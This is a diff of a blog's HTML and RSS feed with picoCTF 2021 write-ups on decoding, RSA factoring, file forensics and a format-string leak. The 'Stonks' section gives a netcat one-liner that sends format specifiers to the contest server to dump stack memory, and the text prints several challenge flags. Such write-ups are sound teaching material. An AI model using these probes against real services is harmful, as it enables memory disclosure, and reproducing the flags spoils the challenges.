-<span style="color:#ff79c6">&gt;&gt;&gt;</span> integers <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">float</span>(x<span style="color:#ff79c6">.</span>strip(<span style="color:#f1fa8c">&#39; &#34;&#39;</span>)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> characters <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(x)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers]
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> characters
-[<span style="color:#f1fa8c">&#39;p&#39;</span>, <span style="color:#f1fa8c">&#39;i&#39;</span>, <span style="color:#f1fa8c">&#39;c&#39;</span>, <span style="color:#f1fa8c">&#39;o&#39;</span>, <span style="color:#f1fa8c">&#39;C&#39;</span>, <span style="color:#f1fa8c">&#39;T&#39;</span>, <span style="color:#f1fa8c">&#39;F&#39;</span>, <span style="color:#f1fa8c">&#39;{&#39;</span>, <span style="color:#f1fa8c">&#39;g&#39;</span>, <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;k&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;y&#39;</span>, <span style="color:#f1fa8c">&#39;!&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;n&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;c&#39;</span>, <span style="color:#f1fa8c">&#39;3&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;k&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;y&#39;</span>, <span style="color:#f1fa8c">&#39;!&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;f&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;5&#39;</span>, <span style="color:#f1fa8c">&#39;f&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;4&#39;</span>, <span style="color:#f1fa8c">&#39;}&#39;</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>]
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join(characters)
-<span style="color:#f1fa8c">&#39;picoCTF{g00d_k1tty!_n1c3_k1tty!_afd5fda4}</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="transformation">Transformation</h2>
-<p>Auditing the provided piece of code (below), we can reverse engineer and identify some form of custom encoding:</p>
-<ul>
-<li>
-<p>The encoding works two bytes at a time because of <code>range(.., 2)</code>. So we have to read 16bits at a time.</p>
-</li>
-<li>
-<p>Every two bytes, each byte are converted in integer value with <code>ord</code></p>
-</li>
-<li>
-<p>First byte is multiplied by 256 with <code>&lt;&lt; 8</code> operation, then second byte is added to the result</p>
-<p>&lsquo;'.join([chr((ord(flag[i]) &laquo; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])</p>
-</li>
-</ul>
-<p>This is a typical packing transformation which is totally reversible. To unpack:</p>
-<ul>
-<li>First byte can be retrieved by dividing by 256</li>
-<li>Second byte is simply the rest of the division by 256</li>
-</ul>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/python3</span>
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">unpack</span>(encoded_flag):
-    flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
-    <span style="color:#ff79c6">for</span> packed_char <span style="color:#ff79c6">in</span> encoded_flag:
-        start_int <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char) <span style="color:#6272a4">#get the integer value of the packed unicode character</span>
-        highChar <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char)<span style="color:#ff79c6">&gt;&gt;</span><span style="color:#bd93f9">8</span>  <span style="color:#6272a4">#bit shift the integer 8 bits to the right, which in essence divides by 256</span>
-        flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(highChar)
-        lowChar <span style="color:#ff79c6">=</span> start_int <span style="color:#ff79c6">-</span> (highChar<span style="color:#ff79c6">&lt;&lt;</span><span style="color:#bd93f9">8</span>) <span style="color:#6272a4">#difference between sum of 2 packed characters, and the first character multiplied by 256 or &lt;&lt;8</span>
-        lowChar <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char)<span style="color:#ff79c6">%</span><span style="color:#bd93f9">256</span> <span style="color:#6272a4">#or you could simply use the modulus operator to get the remainder, which will be the lower char</span>
-        <span style="color:#6272a4"># explanation for retrieving lowChar.  If you multiple a number by 256</span>
-        <span style="color:#6272a4"># and then add another number that is less than 256,</span>
-        <span style="color:#6272a4"># the number added will always be the remainder when dividing the</span>
-        <span style="color:#6272a4"># sum of those two numbers by 256.</span>
-        flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(lowChar)
-    <span style="color:#8be9fd;font-style:italic">print</span>(flag)
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pack</span>(flag):
-    <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">len</span>(flag)<span style="color:#ff79c6">%</span><span style="color:#bd93f9">2</span>):  <span style="color:#6272a4">#must be divisible by 2 since two chars are packed into a single char during encoding</span>
-        flag<span style="color:#ff79c6">+=</span><span style="color:#f1fa8c">&#34; &#34;</span>     <span style="color:#6272a4">#add blank space for padding</span>
-    encoded_flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#8be9fd;font-style:italic">chr</span>((<span style="color:#8be9fd;font-style:italic">ord</span>(flag[i]) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">ord</span>(flag[i <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>])) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(flag), <span style="color:#bd93f9">2</span>)])
-    <span style="color:#8be9fd;font-style:italic">print</span>(encoded_flag)
-    <span style="color:#ff79c6">return</span> encoded_flag
-
-<span style="color:#6272a4">#flag = &#34;This is the text that will be packed&#34;</span>
-<span style="color:#6272a4">#enc = pack(flag)</span>
-
-encoded <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;./enc&#34;</span>, mode<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;r&#39;</span>, encoding<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span>)
-enc <span style="color:#ff79c6">=</span> encoded<span style="color:#ff79c6">.</span>read()
-unpack(enc)
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="stonks">Stonks</h2>
-<p>There is a format-string vulnerability.</p>
-<pre><code>(echo 1; for i in {1..1}; do echo -n &quot;%${i}\$08x&quot; ; done ; echo) | nc mercury.picoctf.net 6989
+            <guid>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-binary-exploitation/</guid>
+            <description>Stonks There is a format-string vulnerability.
+(echo 1; for i in {1..50}; do echo -n &amp;quot;%${i}\$08x&amp;quot; ; done ; echo) | nc mercury.picoctf.net 6989  There is some ASCII characters in the output, so we can convert from hex the output to read the string
+We find the string but we have the wrong Endianness ocip{FTC0l_I4_t5m[..SNIP..]..}
+With Cyberchef it is easy, simply click here to view the solution.
+in python3, it is more tricky:</description>
+            <content type="html"><![CDATA[<h2 id="stonks">Stonks</h2>
+<p>There is a <a href="https://stackoverflow.com/questions/5672996/format-string-vulnerability-printf#5673451">format-string vulnerability</a>.</p>
+<pre><code>(echo 1; for i in {1..50}; do echo -n &quot;%${i}\$08x&quot; ; done ; echo) | nc mercury.picoctf.net 6989
 </code></pre>
 <p>There is some ASCII characters in the output, so we can convert from hex the output to read the string</p>
 <p>We find the string but we have the wrong Endianness <code>ocip{FTC0l_I4_t5m[..SNIP..]..}</code></p>
-<p>With Cyberchef it is easy, simply click (<a href="https://cyberchef.org/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&amp;input=MDk2ZWU0NzAwODA0YjAwMDA4MDQ4OWMzZjdmNTBkODBmZmZmZmZmZjAwMDAwMDAxMDk2ZWMxNjBmN2Y1ZTExMGY3ZjUwZGM3MDAwMDAwMDAwOTZlZDE4MDAwMDAwMDA0MDk2ZWU0NTAwOTZlZTQ3MDZmNjM2OTcwN2I0NjU0NDMzMDZjNWY0OTM0NWY3NDM1NmQ1ZjZjNmMzMDZkNWY3OTVmNzkzMzZlMzUzODYxMzAzMjM1NjUzM2ZmOGYwMDdkZjdmOGJhZjhmN2Y1ZTQ0MGJhMjAyZTAwMDAwMDAwMDEwMDAwMDAwMGY3ZGVkY2U5ZjdmNWYwYzBmN2Y1MDVjMGY3ZjUwMDAwZmY4Zjg5MThmN2RkZTY4ZGY3ZjUwNWMwMDgwNDhlY2FmZjhmODkyNDAwMDAwMDAwZjdmNzJmMDkwODA0YjAwMGY3ZjUwMDAwZjdmNTBlMjBmZjhmODk1OA">https://cyberchef.org/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&amp;input=MDk2ZWU0NzAwODA0YjAwMDA4MDQ4OWMzZjdmNTBkODBmZmZmZmZmZjAwMDAwMDAxMDk2ZWMxNjBmN2Y1ZTExMGY3ZjUwZGM3MDAwMDAwMDAwOTZlZDE4MDAwMDAwMDA0MDk2ZWU0NTAwOTZlZTQ3MDZmNjM2OTcwN2I0NjU0NDMzMDZjNWY0OTM0NWY3NDM1NmQ1ZjZjNmMzMDZkNWY3OTVmNzkzMzZlMzUzODYxMzAzMjM1NjUzM2ZmOGYwMDdkZjdmOGJhZjhmN2Y1ZTQ0MGJhMjAyZTAwMDAwMDAwMDEwMDAwMDAwMGY3ZGVkY2U5ZjdmNWYwYzBmN2Y1MDVjMGY3ZjUwMDAwZmY4Zjg5MThmN2RkZTY4ZGY3ZjUwNWMwMDgwNDhlY2FmZjhmODkyNDAwMDAwMDAwZjdmNzJmMDkwODA0YjAwMGY3ZjUwMDAwZjdmNTBlMjBmZjhmODk1OA</a>)</p>
+<p>With Cyberchef it is easy, <a href="https://cyberchef.org/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&amp;input=MDk2ZWU0NzAwODA0YjAwMDA4MDQ4OWMzZjdmNTBkODBmZmZmZmZmZjAwMDAwMDAxMDk2ZWMxNjBmN2Y1ZTExMGY3ZjUwZGM3MDAwMDAwMDAwOTZlZDE4MDAwMDAwMDA0MDk2ZWU0NTAwOTZlZTQ3MDZmNjM2OTcwN2I0NjU0NDMzMDZjNWY0OTM0NWY3NDM1NmQ1ZjZjNmMzMDZkNWY3OTVmNzkzMzZlMzUzODYxMzAzMjM1NjUzM2ZmOGYwMDdkZjdmOGJhZjhmN2Y1ZTQ0MGJhMjAyZTAwMDAwMDAwMDEwMDAwMDAwMGY3ZGVkY2U5ZjdmNWYwYzBmN2Y1MDVjMGY3ZjUwMDAwZmY4Zjg5MThmN2RkZTY4ZGY3ZjUwNWMwMDgwNDhlY2FmZjhmODkyNDAwMDAwMDAwZjdmNzJmMDkwODA0YjAwMGY3ZjUwMDAwZjdmNTBlMjBmZjhmODk1OA">simply click here</a>
+to view the solution.</p>
 <p>in python3, it is more tricky:</p>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
@@ -15774,58 +16036,452 @@ flag <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>
 <span style="color:#8be9fd;font-style:italic">print</span>(flag)
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="get-ahead">GET aHEAD</h2>
-<pre><code>curl -is -X HEAD http://mercury.picoctf.net:34561/index.php | grep flag | cut -d' ' -f2
-</code></pre>
-<h2 id="mind-your-ps-and-qs">Mind your Ps and Qs</h2>
-<pre><code>Decrypt my super sick RSA:
-c: 861270243527190895777142537838333832920579264010533029282104230006461420086153423
-n: 1311097532562595991877980619849724606784164430105441327897358800116889057763413423
-e: 65537
-</code></pre>
-<p>if n is small then it can be factorized: <a href="http://factordb.com/index.php?query=831416828080417866340504968188990032810316193533653516022175784399720141076262857">http://factordb.com/index.php?query=831416828080417866340504968188990032810316193533653516022175784399720141076262857</a></p>
-<p>FactorDB is also available in python with <code>pip3 install factordb-pycli</code>:</p>
+</div>]]></content>
+        </item>
+        
+        <item>
+            <title>picoCTF 2021 - Forensics</title>
+            <link>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-forensics/</link>
+            <pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-forensics/</guid>
+            <description>information 1  exiftool cat.jpg | grep License | awk &amp;#39;{print $3}&amp;#39; | base64 -d   Matryoshka doll The downloaded file is NOT a jpg, it is a PNG:
+file dolls.jpg dolls.jpg: PNG image data, 594 x 1104, 8-bit/color RGBA, non-interlaced  Zsteg has found a hidden ZIP file, at the end of the image:
+zsteg dolls.jpg [?] 379138 bytes of extra data after image end (IEND), offset = 0x4286c extradata:0 .</description>
+            <content type="html"><![CDATA[<h2 id="information">information</h2>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">from</span> factordb.factordb <span style="color:#ff79c6">import</span> FactorDB
-
-n <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1311097532562595991877980619849724606784164430105441327897358800116889057763413423</span>
-
-f <span style="color:#ff79c6">=</span> FactorDB(n)
-f<span style="color:#ff79c6">.</span>connect()
-p, q <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">.</span>get_factor_list()
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">exiftool cat.jpg | grep License | awk <span style="color:#f1fa8c">&#39;{print $3}&#39;</span> | base64 -d
 </code></pre></td></tr></table>
 </div>
-</div><p>Once factorized, we can calculate the totient ph and perform some arithmetic with an optimized C-coded python library <code>pip3 install gmpy2</code></p>
+</div><h2 id="matryoshka-doll">Matryoshka doll</h2>
+<p>The downloaded file is NOT a jpg, it is a PNG:</p>
+<pre><code>file dolls.jpg
+dolls.jpg: PNG image data, 594 x 1104, 8-bit/color RGBA, non-interlaced
+</code></pre>
+<p>Zsteg has found a hidden ZIP file, at the end of the image:</p>
+<pre><code>zsteg dolls.jpg
+[?] 379138 bytes of extra data after image end (IEND), offset = 0x4286c
+extradata:0         .. file: Zip archive data, at least v2.0 to extract
+    00000000: 50 4b 03 04 14 00 00 00  08 00 e2 02 70 52 dd bc  |PK..........pR..|
+    00000010: 03 b7 46 c8 05 00 c2 db  05 00 13 00 1c 00 62 61  |..F...........ba|
+    00000020: 73 65 5f 69 6d 61 67 65  73 2f 32 5f 63 2e 6a 70  |se_images/2_c.jp|
+    00000030: 67 55 54 09 00 03 68 fa  4f 60 68 fa 4f 60 75 78  |gUT...h.O`h.O`ux|
+    00000040: 0b 00 01 04 00 00 00 00  04 00 00 00 00 ec fc 67  |...............g|
+    00000050: 58 53 5f d7 2e 8e d2 a4  86 26 4a 27 40 40 10 90  |XS_......&amp;J'@@..|
+    00000060: 2e d2 42 13 10 50 8a 82  0a d2 8b 4a 93 de 12 3a  |..B..P.....J...:|
+    00000070: 82 84 a2 14 01 11 81 d0  45 3a 2a bd 43 e8 28 bd  |........E:*.C.(.|
+    00000080: 28 3d b4 04 10 08 a1 85  fe 4f fc 3d cf f3 be 7b  |(=.......O.=...{|
+    00000090: bf fb ff ed 7c 38 e7 da  87 eb 0a 59 59 6b ce b1  |....|8.....YYk..|
+    000000a0: d6 1c 73 8c 7b dc 63 ae  b1 56 f4 43 7d 2d 5a 6a  |..s.{.c..V.C}-Zj|
+    000000b0: 76 6a 22 22 22 5a 1d 6d  0d 43 22 22 12 3a 22 22  |vj&quot;&quot;&quot;Z.m.C&quot;&quot;.:&quot;&quot;|
+    000000c0: 32 43 4a 72 fc 9e 5e 41  48 3c 11 11 e0 85 a3 ba  |2CJr..^AH&lt;......|
+    000000d0: fa 43 1d 75 75 9e 87 9e  6e 2f 1d 5f bd 20 22 d2  |.C.uu...n/._. &quot;.|
+    000000e0: 8e 4e 49 a5 30 31 ea 63  0e 45 7d 78 7c d5 94 87  |.NI.01.c.E}x|...|
+    000000f0: c4 f0 ae 5b ae 36 2d cf  8d 08 66 35 d5 62 1e 61  |...[.6-...f5.b.a|
+</code></pre>
+<p>We extract the zip:</p>
+<pre><code>zsteg -E extradata:0 dolls.jpg &gt; dolls.zip
+unzip dolls.zip
+Archive:  dolls.zip
+  inflating: base_images/2_c.jpg
+file base_images/2_c.jpg
+2_c.jpg: PNG image data, 526 x 1106, 8-bit/color RGBA, non-interlaced
+</code></pre>
+<p>The uncompressed image is NOT a jpg, but a PNG, we use zsteg again to extract another hidden file:</p>
+<pre><code>zsteg -E extradata:0 2_c.jpg &gt; 2_c.zip
+unzip 2_c.zip
+Archive:  2_c.zip
+  inflating: base_images/3_c.jpg
+file base_images/3_c.jpg
+base_images/3_c.jpg: PNG image data, 428 x 1104, 8-bit/color RGBA, non-interlaced
+</code></pre>
+<p>Similarly, 3_c.jpg is a PNG that contains a hidden file 4_c.jpg, which itself contains a hidden zip file.</p>
+<p>At this stage, I am wondering whether I should script this repetitive extraction procedure, but fortunately wereached the end.
+The zip contains the flag in TXT</p>
+<pre><code>zsteg -E extradata:0 base_images/4_c.jpg &gt; 4_c.zip
+unzip 4_c.zip
+cat flag.txt
+</code></pre>
+<h2 id="tunn3l_v1s10n">tunn3l_v1s10n</h2>
+<p>resources:</p>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/BMP_file_format">Wikipedia - BMP_file_format</a></li>
+<li><a href="https://docs.fileformat.com/image/bmp/">BMP File specifications</a></li>
+<li><a href="https://docs.fileformat.com/image/dib/">BMP - DIB Heder</a></li>
+<li><a href="https://medium.com/sysf/bits-to-bitmaps-a-simple-walkthrough-of-bmp-image-format-765dc6857393">BMP format walkthrough</a></li>
+<li><a href="https://kaitai.io/">Kaitai Struct</a></li>
+</ul>
+<p>The file format is not identified by the <strong>file</strong> command</p>
+<pre><code>curl -sLO https://mercury.picoctf.net/static/7b2d7c26630e977197022d0af09e3aeb/tunn3l_v1s10n
+file tunn3l_v1s10n
+tunn3l_v1s10n: data
+</code></pre>
+<p>Examining the header, we can make a guess that this is a BMP image:</p>
+<pre><code>xxd tunn3l_v1s10n | head
+00000000: 424d 8e26 2c00 0000 0000 bad0 0000 bad0  BM.&amp;,...........
+00000010: 0000 6e04 0000 3201 0000 0100 1800 0000  ..n...2.........
+00000020: 0000 5826 2c00 2516 0000 2516 0000 0000  ..X&amp;,.%...%.....
+00000030: 0000 0000 0000 231a 1727 1e1b 2920 1d2a  ......#..'..) .*
+00000040: 211e 261d 1a31 2825 352c 2933 2a27 382f  !.&amp;..1(%5,)3*'8/
+00000050: 2c2f 2623 332a 262d 2420 3b32 2e32 2925  ,/&amp;#3*&amp;-$ ;2.2)%
+00000060: 3027 2333 2a26 382c 2836 2b27 392d 2b2f  0'#3*&amp;8,(6+'9-+/
+00000070: 2623 1d12 0e23 1711 2916 0e55 3d31 9776  &amp;#...#..)..U=1.v
+00000080: 668b 6652 996d 569e 7058 9e6f 549c 6f54  f.fR.mV.pX.oT.oT
+00000090: ab7e 63ba 8c6d bd8a 69c8 9771 c193 71c1  .~c..m..i..q..q.
+</code></pre>
+<p>We can examine what should be a <a href="https://docs.fileformat.com/image/bmp/#bitmap-file-header">BMP file header</a> and compare:
+According to the documentation a BMP should start with 0x424d which is exactly what we have.
+Somehow there must be some coruption on this BMP as the file command cannot identify its type.
+Luckily exiftool is more successful to identify the format:</p>
+<pre><code>exiftool tunn3l_v1s10n
+ExifTool Version Number         : 12.42
+File Name                       : tunn3l_v1s10n
+Directory                       : .
+File Size                       : 2.9 MB
+File Modification Date/Time     : 2022:08:19 13:17:00+08:00
+File Access Date/Time           : 2022:08:19 13:17:18+08:00
+File Inode Change Date/Time     : 2022:08:19 13:17:00+08:00
+File Permissions                : -rw-r--r--
+File Type                       : BMP
+File Type Extension             : bmp
+MIME Type                       : image/bmp
+BMP Version                     : Unknown (53434)
+Image Width                     : 1134
+Image Height                    : 306
+Planes                          : 1
+Bit Depth                       : 24
+Compression                     : None
+Image Length                    : 2893400
+Pixels Per Meter X              : 5669
+Pixels Per Meter Y              : 5669
+Num Colors                      : Use BitDepth
+Num Important Colors            : All
+Red Mask                        : 0x27171a23
+Green Mask                      : 0x20291b1e
+Blue Mask                       : 0x1e212a1d
+Alpha Mask                      : 0x311a1d26
+Color Space                     : Unknown (,5%()
+Rendering Intent                : Unknown (826103054)
+Image Size                      : 1134x306
+Megapixels                      : 0.347
+</code></pre>
+<p>I am not able to open the file (probably because it is corrupted) with my image editor.
+I also try with Firefox by typing the uri <code>file:///absolute/path/to/tunn3l_v1s10n.bmp</code> but it complains <strong>The image “file:///private/tmp/tunn3l_v1s10n.bmp” cannot be displayed because it contains errors.</strong> .
+Brave is successful to open the image, it is a large black square with a small white color square in the middle, which suggest the exit of a tunnel.</p>
+<p>According to the metadata, the image is 1134x306 pixels and each pixel is 4 bytes (red, green, blue, alpha)
+so more or less the header we should have about 1388016 bytes image size (1134 x 306 x 4) which represents 1355 kilo bytes (1388016 // 1024).
+However, the BMP is irreasonnably bigger: 2.8 MB according to metadata, which can be further verified with the below:</p>
+<pre><code>ls -l tunn3l_v1s10n
+-rw-r--r-- 1 ctf ctf 2893454 Aug 19 04:54 tunn3l_v1s10n
+du -sh tunn3l_v1s10n
+2.8M	tunn3l_v1s10n
+</code></pre>
+<h3 id="internals">internals</h3>
+<p>We need to examine headers according to specifications:</p>
+<p><img src="https://upload.wikimedia.org/wikipedia/commons/7/75/BMPfileFormat.svg" alt="BMP structure"></p>
+<p>We first have a 14 bytes <em>File Header</em>_ section with signature <code>BM</code>.
+Such signature is equivalent to BM support for __Windows 3.1x, 95, NT, &hellip; etc__
+and is always followed with a 40 bytes __DIB header__ section.</p>
+<p>File Header</p>
+<table>
+<thead>
+<tr>
+<th>offset</th>
+<th>name</th>
+<th>size (bytes)</th>
+<th>hex</th>
+<th>value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0</td>
+<td>Signature</td>
+<td>2</td>
+<td>424d</td>
+<td>BM</td>
+</tr>
+<tr>
+<td>0x2</td>
+<td>BMP size in bytes</td>
+<td>4</td>
+<td>8e26 2c00</td>
+<td>0x2c26e8 = 2893454</td>
+</tr>
+<tr>
+<td>0xa</td>
+<td>offset of pixel array (image data)</td>
+<td>4</td>
+<td>bad0 0000</td>
+<td>0xd0ba = 53434</td>
+</tr>
+</tbody>
+</table>
+<p>DIB Header - BITMAPINFOHEADER</p>
+<p>A fixed size of 40 bytes (0x28) is expected for this header, but we have 53434, which is incorrect. Will have to patch this.</p>
+<table>
+<thead>
+<tr>
+<th>offset</th>
+<th>name</th>
+<th>size (bytes)</th>
+<th>hex</th>
+<th>value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0xe</td>
+<td>Header size</td>
+<td>4</td>
+<td>bad0 0000</td>
+<td>0xd0ba = 53434</td>
+</tr>
+</tbody>
+</table>
+<p>Patching:</p>
+<pre><code>echo &quot;00000000: 424d 8e26 2c00 0000 0000 bad0 0000 2800&quot; | xxd -r - tunn3l_v1s10n
+</code></pre>
+<p>After patching, we can open the BMP and read a fake flag &ldquo;notaflag{sorry}&quot;; so we have to investigate further</p>
+<p>We better examine the DIB header more deeply to find any other inconsistencies. Since we have patched the DIB header length,
